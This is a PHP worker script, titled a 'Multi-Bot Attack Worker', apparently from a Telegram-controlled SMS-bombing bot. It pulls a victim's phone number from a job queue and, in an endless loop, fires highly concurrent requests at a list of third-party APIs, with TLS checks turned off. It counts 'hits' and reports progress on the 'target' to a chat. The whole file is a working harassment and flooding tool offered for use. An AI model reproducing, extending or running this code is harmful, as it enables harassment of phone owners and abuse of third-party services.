<?php
// worker.php — Multi-Bot Attack Worker
// Usage: php worker.php <worker_id>

declare(strict_types=1);
@ini_set('memory_limit', '-1');
@ini_set('max_execution_time', '0');
error_reporting(E_ALL & ~E_WARNING & ~E_DEPRECATED & ~E_NOTICE);
date_default_timezone_set('Asia/Dhaka');
set_time_limit(0);
ignore_user_abort(true);

if (function_exists('posix_setrlimit')) {
    @posix_setrlimit(POSIX_RLIMIT_NOFILE, 1048576, 1048576);
}

$workerId = (int) ($argv[1] ?? 1);

const QUEUE_DIR    = __DIR__ . "/queue";
const RUNNING_DIR  = __DIR__ . "/running";
const STATE_DIR    = __DIR__ . "/state";
const STOP_DIR     = __DIR__ . "/stop";
const LOG_DIR      = __DIR__ . "/logs";

foreach ([QUEUE_DIR, RUNNING_DIR, STATE_DIR, STOP_DIR, LOG_DIR] as $d) {
    if (!is_dir($d)) @mkdir($d, 0777, true);
}

$ULTIMATE_APIS = require __DIR__ . "/apis.php";
require_once __DIR__ . "/multibot.php";

function wLog($id, $m) {
    @file_put_contents(LOG_DIR . "/worker_$id.log",
        "[" . date('H:i:s') . "] $m\n", FILE_APPEND);
}

function pickJob() {
    $files = glob(QUEUE_DIR . "/job_*.json");
    if (empty($files)) return null;
    sort($files, SORT_NATURAL);
    foreach ($files as $f) {
        $run = RUNNING_DIR . "/run_" . basename($f);
        if (@rename($f, $run)) {
            $data = @json_decode(@file_get_contents($run), true);
            if (is_array($data)) return ["file" => $run, "data" => $data];
            @unlink($run);
        }
    }
    return null;
}

wLog($workerId, "Worker #$workerId started (PID " . getmypid() . ")");

// cURL Multi Pool
$mh = curl_multi_init();
@curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, 100000);
@curl_multi_setopt($mh, CURLMOPT_MAX_HOST_CONNECTIONS, 5000);
@curl_multi_setopt($mh, CURLMOPT_MAX_TOTAL_CONNECTIONS, 100000);
if (defined('CURLMOPT_PIPELINING')) {
    @curl_multi_setopt($mh, CURLMOPT_PIPELINING, CURLPIPE_MULTIPLEX);
}

while (true) {
    $job = pickJob();
    if ($job === null) {
        usleep(50000);
        continue;
    }

    $jobFile = $job["file"];
    $j = $job["data"];
    $uid = (int) $j['uid'];
    $phone = $j['phone'];
    $cid = (int) $j['cid'];
    $mid = (int) $j['mid'];
    $tk = md5($uid . "_" . $phone);
    $stopFile = STOP_DIR . "/t_$tk.flag";
    $stateFile = STATE_DIR . "/t_$tk.json";

    if (file_exists($stopFile)) @unlink($stopFile);

    $cycle = 0;
    $total_hits = 0;
    $start = time();
    $lastEdit = 0;

    while (true) {
        if (file_exists($stopFile)) { @unlink($stopFile); break; }
        if (!file_exists($jobFile)) break;

        $cycle++;

        try {
            $handles = [];
            foreach ($ULTIMATE_APIS as $api) {
                try {
                    $ch = curl_init();
                    $url = is_callable($api['url']) ? $api['url']($phone) : $api['url'];
                    $data = isset($api['data']) && is_callable($api['data']) ? $api['data']($phone) : null;

                    $opts = [
                        CURLOPT_URL => $url,
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_TIMEOUT => 2,
                        CURLOPT_CONNECTTIMEOUT => 1,
                        CURLOPT_SSL_VERIFYPEER => false,
                        CURLOPT_SSL_VERIFYHOST => false,
                        CURLOPT_FOLLOWLOCATION => true,
                        CURLOPT_MAXREDIRS => 1,
                        CURLOPT_ENCODING => "",
                        CURLOPT_USERAGENT => "Mozilla/5.0 (Linux; Android 13)",
                        CURLOPT_DNS_CACHE_TIMEOUT => 600,
                        CURLOPT_TCP_KEEPALIVE => 1,
                        CURLOPT_TCP_KEEPIDLE => 60,
                        CURLOPT_TCP_KEEPINTVL => 20,
                        CURLOPT_HTTPHEADER => !empty($api['headers']) ? $api['headers'] : [],
                        CURLOPT_FRESH_CONNECT => false,
                        CURLOPT_FORBID_REUSE => false,
                    ];
                    if (defined('CURLOPT_TCP_FASTOPEN')) $opts[CURLOPT_TCP_FASTOPEN] = true;
                    if (defined('CURLOPT_HTTP_VERSION')) $opts[CURLOPT_HTTP_VERSION] = CURL_HTTP_VERSION_2_0;

                    if ($api['method'] === 'POST') {
                        $opts[CURLOPT_POST] = true;
                        if ($data) $opts[CURLOPT_POSTFIELDS] = $data;
                    }

                    curl_setopt_array($ch, $opts);
                    curl_multi_add_handle($mh, $ch);
                    $handles[] = $ch;
                } catch (Throwable $e) { }
            }

            $running = null;
            do {
                $status = curl_multi_exec($mh, $running);
                if ($running) curl_multi_select($mh, 0.002);
            } while ($running > 0 && $status == CURLM_OK);

            foreach ($handles as $ch) {
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($code >= 200 && $code < 300) $total_hits++;
                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
            }
        } catch (Throwable $e) {
            wLog($workerId, "Cycle $cycle error: " . $e->getMessage());
        }

        if ($cycle % 5 === 0) {
            @file_put_contents($stateFile, json_encode([
                "uid"=>$uid,"phone"=>$phone,"cid"=>$cid,"mid"=>$mid,
                "hits"=>$total_hits,"cycle"=>$cycle,
                "last_update"=>date('H:i:s'),"pid"=>getmypid(),
                "started"=>$start,"worker"=>$workerId
            ]), LOCK_EX);
        }

        $now = time();
        if ($now - $lastEdit >= 5) {
            $lastEdit = $now;
            $elapsed = $now - $start;
            $hps = $elapsed > 0 ? round($total_hits / $elapsed, 2) : 0;

            $status = "▓▒░ <b>𝙰𝚌𝚝𝚒𝚟𝚎 — 𝙲𝚢𝚌𝚕𝚎 $cycle</b> ░▒▓\n"
                    . "─────────────────────────────\n\n"
                    . "┌─── <b>[ 🎯 ᴛᴀʀɢᴇᴛ ]</b>\n"
                    . "├ 📱 ᴘʜᴏɴᴇ : <code>$phone</code>\n"
                    . "├ 🔧 ᴡᴏʀᴋᴇʀ : <code>#$workerId</code>\n"
                    . "└ 📡 ᴀᴘɪs : <code>" . count($ULTIMATE_APIS) . "</code>\n\n"
                    . "┌─── <b>[ 📊 𝙻𝚒𝚟𝚎 𝚂𝚝𝚊𝚝𝚜 ]</b>\n"
                    . "├ 🔥 ʜɪᴛs : <code>" . number_format($total_hits) . "</code>\n"
                    . "├ ⚡ ʜɪᴛs/sᴇᴄ : <code>$hps</code>\n"
                    . "├ 🔄 ᴄʏᴄʟᴇs : <code>$cycle</code>\n"
                    . "└ ⏱️ ᴇʟᴀᴘsᴇᴅ : <code>{$elapsed}s</code>";

            $kb = ["inline_keyboard" => [[
                ["text" => "🛑 𝐒ᴛᴏᴘ 𝐓ʜɪs 𝐓ᴀʀɢᴇᴛ", "callback_data" => "stop_target_" . $phone]
            ]]];
            editMsgMulti($cid, $mid, $status, $kb);
        }
    }

    $elapsed = time() - $start;
    @unlink($jobFile);

    $final = "▓▒░ <b>𝚃𝚊𝚛𝚐𝚎𝚝 𝚃𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍</b> ░▒▓\n"
           . "─────────────────────────────\n"
           . "├ 📱 ᴘʜᴏɴᴇ : <code>$phone</code>\n"
           . "├ 🔄 ᴄʏᴄʟᴇs : <code>$cycle</code>\n"
           . "├ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ : <code>{$elapsed}s</code>\n"
           . "└ 🔥 ʜɪᴛs : <code>" . number_format($total_hits) . "</code>";
    editMsgMulti($cid, $mid, $final);

    @unlink($stateFile);
    wLog($workerId, "Done: uid=$uid hits=$total_hits");
}